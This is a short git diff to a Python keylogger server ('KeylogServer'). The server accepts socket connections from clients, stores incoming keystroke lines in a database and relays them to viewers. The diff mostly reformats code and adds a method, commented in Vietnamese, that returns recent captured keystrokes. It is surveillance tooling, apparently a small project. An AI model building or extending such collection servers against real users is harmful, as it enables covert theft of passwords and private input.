@@ -1,7 +1,6 @@
 import socket
 import json
 import threading
-
 from datetime import datetime
 from src.client.key_log import database
 
@@ -13,7 +12,7 @@ class KeylogServer:
         self.server_socket = None
         self.is_running = False
 
-        self.view_clients = []     
+        self.view_clients = []
         self.lock = threading.Lock()
 
     def start(self):
@@ -23,14 +22,16 @@ class KeylogServer:
             self.server_socket.bind((self.host, self.port))
             self.server_socket.listen(20)
 
-            print(f"[+] Server listening on {self.host}:{self.port}")
+            print(f"[+] Server running at {self.host}:{self.port}")
             self.is_running = True
 
             while self.is_running:
                 client_socket, address = self.server_socket.accept()
-                threading.Thread(target=self.client_handler,
-                                 args=(client_socket, address),
-                                 daemon=True).start()
+                threading.Thread(
+                    target=self.client_handler,
+                    args=(client_socket, address),
+                    daemon=True
+                ).start()
 
         except Exception as e:
             print("[-] Server error:", e)
@@ -79,6 +80,7 @@ class KeylogServer:
                     break
 
                 buffer += data
+
                 while "\n" in buffer:
                     line, buffer = buffer.split("\n", 1)
 
@@ -120,6 +122,10 @@ class KeylogServer:
 
             for c in remove_list:
                 self.view_clients.remove(c)
+
+    # 🔥 HÀM MỚI → giao diện có thể gọi để lấy log
+    def get_latest_keystrokes(self, limit=50):
+        return database.get_recent_keystrokes(limit)
 
     def stop(self):
         print("[*] Server stopped.")
